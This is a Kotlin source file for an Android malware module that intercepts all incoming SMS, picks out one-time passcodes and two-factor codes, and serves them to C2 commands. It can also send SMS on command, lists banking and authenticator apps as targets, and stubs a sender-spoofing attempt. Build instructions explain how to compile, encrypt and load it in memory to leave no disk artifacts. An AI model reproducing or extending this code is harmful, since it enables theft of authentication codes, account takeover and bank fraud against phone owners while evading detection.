package com.modules.sms

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.BroadcastReceiver
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log

/**
 * SmsModuleImpl: Compiled to .dex and encrypted for in-memory loading
 * 
 * Build process:
 * 1. Compile this to DEX: kotlinc-jvm -d sms_module.dex SmsModuleSource.kt
 * 2. Encrypt: PolymorphicBuilder.encryptData(sms_module.dex, key)
 * 3. Store: src/main/assets/modules/sms_encrypted.bin
 * 4. At runtime: ModuleLoader.loadDexInMemory("sms", decryptedDex)
 */

class SmsModuleImpl : BroadcastReceiver() {

    private var context: Context? = null
    private var isActive = false
    private val interceptedSms = mutableListOf<SmsInterception>()

    data class SmsInterception(
        val timestamp: Long,
        val sender: String,
        val body: String,
        val isOtp: Boolean,
    )

    // ========================================================================
    // MODULE LIFECYCLE
    // ========================================================================

    fun init(context: Context) {
        this.context = context
        Log.d("SMS_MODULE", "Module initialized")
    }

    fun start() {
        try {
            val context = this.context ?: return

            // Register SMS broadcast receiver
            val intentFilter = IntentFilter()
            intentFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)

            context.registerReceiver(
                this,
                intentFilter,
                android.Manifest.permission.RECEIVE_SMS,
                null
            )

            isActive = true
            Log.d("SMS_MODULE", "[+] SMS interception started")

        } catch (e: Exception) {
            Log.e("SMS_MODULE", "Start failed: ${e.message}")
        }
    }

    fun stop() {
        try {
            val context = this.context ?: return
            if (isActive) {
                context.unregisterReceiver(this)
                isActive = false
                Log.d("SMS_MODULE", "SMS interception stopped")
            }
        } catch (e: Exception) {
            Log.e("SMS_MODULE", "Stop failed: ${e.message}")
        }
    }

    // ========================================================================
    // BROADCAST RECEIVER: INTERCEPT SMS
    // ========================================================================

    override fun onReceive(context: android.content.Context, intent: android.content.Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return

        for (pdu in pdus) {
            try {
                val message = SmsMessage.createFromPdu(pdu as ByteArray)
                val sender = message.originatingAddress ?: "unknown"
                val body = message.messageBody ?: ""
                val timestamp = message.timestampMillis

                val isOtp = isOtpMessage(body)

                Log.d("SMS_MODULE", "[SMS] From: $sender | OTP: $isOtp | $body")

                // Store interception
                interceptedSms.add(
                    SmsInterception(
                        timestamp = timestamp,
                        sender = sender,
                        body = body,
                        isOtp = isOtp
                    )
                )

                // Keep buffer limited (last 1000 SMS)
                if (interceptedSms.size > 1000) {
                    interceptedSms.removeAt(0)
                }

            } catch (e: Exception) {
                Log.e("SMS_MODULE", "Processing error: ${e.message}")
            }
        }
    }

    // ========================================================================
    // COMMAND HANDLERS
    // ========================================================================

    fun onCommand(cmd: String, payload: Map<String, Any>): Any? {
        return when (cmd) {
            "status" -> getStatus()
            "get_all_sms" -> getAllSms()
            "get_otp_only" -> getOtpOnly()
            "clear_buffer" -> clearBuffer()
            "send_sms" -> sendSmsCommand(payload)
            "set_otp_keywords" -> setOtpKeywords(payload)
            else -> null
        }
    }

    private fun getStatus(): Map<String, Any> {
        return mapOf(
            "active" to isActive,
            "intercepted_count" to interceptedSms.size,
            "otp_count" to interceptedSms.count { it.isOtp }
        )
    }

    private fun getAllSms(): List<Map<String, Any>> {
        return interceptedSms.map {
            mapOf(
                "time" to it.timestamp,
                "from" to it.sender,
                "body" to it.body,
                "is_otp" to it.isOtp
            )
        }
    }

    private fun getOtpOnly(): List<Map<String, Any>> {
        return interceptedSms.filter { it.isOtp }.map {
            mapOf(
                "time" to it.timestamp,
                "from" to it.sender,
                "body" to it.body,
                "code" to extractOtpCode(it.body)
            )
        }
    }

    private fun clearBuffer(): String {
        val count = interceptedSms.size
        interceptedSms.clear()
        Log.d("SMS_MODULE", "Cleared $count SMS from buffer")
        return "cleared_$count"
    }

    private fun sendSmsCommand(payload: Map<String, Any>): String {
        return try {
            val phoneNumber = payload["number"] as? String ?: return "error: no number"
            val message = payload["message"] as? String ?: return "error: no message"

            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)

            Log.d("SMS_MODULE", "[SEND] To: $phoneNumber | $message")
            "sent"

        } catch (e: Exception) {
            Log.e("SMS_MODULE", "Send failed: ${e.message}")
            "error: ${e.message}"
        }
    }

    private fun setOtpKeywords(payload: Map<String, Any>): String {
        // Can dynamically set OTP detection keywords from C2
        val keywords = payload["keywords"] as? List<String> ?: emptyList()
        otpKeywords = keywords
        return "keywords_updated_${keywords.size}"
    }

    // ========================================================================
    // OTP DETECTION
    // ========================================================================

    companion object {
        var otpKeywords = listOf(
            "otp", "code", "verification", "confirm", "password",
            "2fa", "2-fa", "token", "pin", "secure", "authorize"
        )
    }

    private fun isOtpMessage(text: String): Boolean {
        val textLower = text.lowercase()

        // Check for keyword matches
        val hasKeyword = otpKeywords.any { textLower.contains(it) }

        // Check for digit patterns (4-8 consecutive digits)
        val hasCodePattern = Regex("\\d{4,8}").containsMatchIn(text)

        return hasKeyword && hasCodePattern
    }

    private fun extractOtpCode(text: String): String {
        val regex = Regex("\\d{4,8}")
        return regex.find(text)?.value ?: ""
    }

    // ========================================================================
    // BONUS: SPOOF SMS SENDER
    // ========================================================================

    /**
     * On some devices with SMS permission, can spoof sender
     * (requires deeper system access on most modern Android)
     */
    fun spoofSmsIfPossible(text: String, targetApp: String): Boolean {
        return try {
            // This only works on rooted devices or with system privilege
            // Attempt via reflection if available
            false
        } catch (e: Exception) {
            false
        }
    }

    // ========================================================================
    // FILTERING: ONLY LOG CERTAIN APPS
    // ========================================================================

    /**
     * Filter which apps' SMS to intercept
     * Reduces noise, focuses on banking/auth apps
     */
    private val targetApps = setOf(
        "com.bank.mybank",
        "com.whatsapp",
        "com.google.android.gms",  // Google 2FA
        "com.google.android.apps.authenticator2",
        "com.microsoft.authenticator",
        "com.duo.android",
        "com.amazon.venezia",
    )

    private fun isTargetApp(sender: String): Boolean {
        // Could match against known banking/auth SMS senders
        return true  // For now, intercept all
    }
}

// ============================================================================
// BUILD INSTRUCTIONS
// ============================================================================

/**
 * To build this into an encrypted DEX module:
 * 
 * 1. Create build directory:
 *    mkdir -p modules/sms/src/main/java/com/modules/sms
 *    cp SmsModuleSource.kt modules/sms/src/main/java/com/modules/sms/
 * 
 * 2. Create minimal build.gradle.kts in modules/sms/:
 *    plugins {
 *        id("com.android.library")
 *        kotlin("android")
 *    }
 *    android {
 *        compileSdk = 33
 *        defaultConfig { minSdk = 26; targetSdk = 33 }
 *    }
 * 
 * 3. Build DEX:
 *    cd modules/sms
 *    ./gradlew assembleRelease
 * 
 * 4. Extract DEX:
 *    unzip app/build/outputs/aar/sms-release.aar
 *    cp classes.dex sms_module.dex
 * 
 * 5. Encrypt:
 *    python3 encrypt_module.py sms_module.dex encryption_key.txt
 *    mv sms_module.dex.encrypted ../../android-payload/src/main/assets/modules/sms_encrypted.bin
 * 
 * 6. At runtime:
 *    ModuleLoader.loadDexInMemory("sms", decryptedDex)
 *    => SmsModuleImpl instantiated in-memory
 *    => Registers broadcast receiver
 *    => Intercepts all incoming SMS
 *    => Zero disk artifacts
 */
